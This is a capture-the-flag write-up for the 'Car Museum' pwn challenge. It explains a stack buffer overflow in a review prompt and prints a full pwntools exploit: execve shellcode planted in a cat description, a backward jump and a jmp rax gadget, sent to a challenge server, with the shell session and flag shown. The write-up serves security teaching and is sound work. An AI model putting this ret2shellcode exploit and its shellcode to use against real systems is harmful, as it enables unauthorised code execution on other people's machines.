# Car Museum - PWN Challenge

## TL;DR

Buffer overflow in the "review" function of the cat museum: `fgets` reads 32 bytes into a 12-byte stack buffer, overwriting the return address. With an executable stack and a `jmp rax` gadget, execution jumps to shellcode previously written in a cat's description.

## Description

Non-stripped ELF x86-64 binary that simulates a "cat museum" with an interactive menu: view cats, add cats, edit descriptions, and exit with the option to write a review.

## Analysis

### Protections

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x400000)
Stack:    Executable
RWX:      Has RWX segments
```

No canary, no PIE, executable stack. Classic ret2shellcode scenario.

### Data Structure

Each cat occupies 80 bytes (`0x50`): 16 bytes for the name + 64 bytes for the description. Cat array on the stack at `rbp-0x330`.

### Vulnerability (CWE-121: Stack Buffer Overflow)

**Option 4 — Review** (`museum+0x185a`):

```c
char review[12];     // at rbp-0xc (only 12 bytes!)
fgets(review, 0x20, stdin);  // reads 32 bytes → 20-byte overflow
```

The `review` buffer is at `rbp-0xc` (12 bytes before saved rbp). `fgets` reads up to 32 bytes, overwriting:
- 12 bytes: review buffer
- 8 bytes: saved rbp
- 8 bytes: return address
- 4 extra bytes

### Key Gadget

```
0x40118c: jmp rax
```

After `fgets`, `rax` contains the pointer to the input buffer (fgets return value). Overwriting ret with `jmp rax` → execution jumps to the beginning of our review buffer.

### Exploitation Chain

```
Cat 0 desc (rbp-0x320): [shellcode + nops]        ← written via option 3
                         ...
Review buf (rbp-0xc):    [jmp -0x319][nops][BBBB][jmp_rax]  ← overflow
                          ^                        |
                          |                        |
                          |    ret → jmp rax → rax = review buf
                          |                        |
                          +------------------------+
                          relative jmp -0x319 → shellcode in cat desc
```

The distance between the review buffer and cat 0's description is constant: `0x320 - 0xc = 0x314 bytes`. The `jmp rel32` in the review buffer jumps backwards to the shellcode.

## Exploit

```python
from pwn import *
context.arch = 'amd64'

p = remote('46.225.117.62', 30026)
JMP_RAX = 0x40118c

# execve("/bin/sh", NULL, NULL)
shellcode = asm('''
    xor rax, rax
    xor rsi, rsi
    xor rdx, rdx
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    mov al, 59
    syscall
''')  # 28 bytes

# Write shellcode to cat 0 description (64 bytes available)
p.recvuntil(b'Choice: ')
p.sendline(b'3')
p.recvuntil(b'editing? ')
p.sendline(b'0')
p.recvuntil(b'description: ')
p.send(shellcode.ljust(63, b'\x90') + b'\n')

# Trigger overflow via review
p.recvuntil(b'Choice: ')
p.sendline(b'4')
p.recvuntil(b'[y/n]: ')
p.sendline(b'y')
p.recvuntil(b'Review: ')

jmp_back = b'\xe9' + p32((-0x319) & 0xFFFFFFFF)  # jmp to shellcode
payload  = jmp_back       # 5 bytes
payload += b'\x90' * 7    # 7 bytes padding (total 12 to rbp)
payload += b'B' * 8       # saved rbp
payload += p64(JMP_RAX)   # return address → jmp rax
p.send(payload + b'\n')

p.interactive()
```

### Execution

```bash
$ python3 exploit.py 46.225.117.62:30026
[+] Opening connection to 46.225.117.62 on port 30026: Done
[*] Shellcode: 28 bytes
[*] Shellcode written to cat 0 desc
[+] Exploit sent, enjoy shell!
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat flag*
upCTF{c4tc4ll1ng_1s_n0t_c00l-LFz4qlBO49406f78}
```

## Flag

```
upCTF{c4tc4ll1ng_1s_n0t_c00l-LFz4qlBO49406f78}
```

## Key Lessons

- **`fgets(buf, size)` with `size` > `sizeof(buf)` = classic overflow** — 32 bytes read into a 12-byte buffer
- **Executable stack + no canary + no PIE = trivial ret2shellcode** — the `jmp rax` gadget is ideal when `rax` points to the input buffer post-fgets
- **Two-stage shellcode**: when the overflow buffer is too small for the full shellcode, use a relative jmp to shellcode stored elsewhere in the same stack frame
- **`xor rax, rax` mandatory before `mov al, 59`** — without clearing the upper bytes of rax, the syscall number is incorrect
- **Relative offsets are ASLR-proof** — the distance between buffers in the same stack frame is constant

## References

- [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)
- [x86-64 Linux Shellcoding](https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf)
